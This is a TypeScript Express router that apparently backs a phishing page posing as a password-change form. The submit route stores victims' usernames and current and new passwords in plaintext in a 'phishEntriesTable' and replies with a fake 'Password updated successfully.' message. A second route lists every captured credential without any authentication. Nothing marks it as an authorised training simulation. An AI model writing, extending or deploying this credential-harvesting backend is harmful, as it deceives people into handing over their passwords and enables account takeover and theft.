import { Router, type IRouter } from "express";
import { db, phishEntriesTable } from "@workspace/db";
import { SubmitCredentialsBody, SubmitCredentialsResponse, GetEntriesResponse } from "@workspace/api-zod";
import { desc } from "drizzle-orm";

const router: IRouter = Router();

router.post("/submit", async (req, res) => {
  const parsed = SubmitCredentialsBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ success: false, message: "Invalid request body" });
    return;
  }

  const { username, currentPassword, confirmCurrentPassword, newPassword, confirmNewPassword } = parsed.data;

  await db.insert(phishEntriesTable).values({
    username,
    currentPassword,
    confirmCurrentPassword,
    newPassword,
    confirmNewPassword,
  });

  const response = SubmitCredentialsResponse.parse({ success: true, message: "Password updated successfully." });
  res.json(response);
});

router.get("/entries", async (_req, res) => {
  const rows = await db.select().from(phishEntriesTable).orderBy(desc(phishEntriesTable.submittedAt));

  const entries = rows.map((r) => ({
    id: r.id,
    username: r.username,
    currentPassword: r.currentPassword,
    confirmCurrentPassword: r.confirmCurrentPassword,
    newPassword: r.newPassword,
    confirmNewPassword: r.confirmNewPassword,
    submittedAt: r.submittedAt.toISOString(),
  }));

  const response = GetEntriesResponse.parse({ entries });
  res.json(response);
});

export default router;
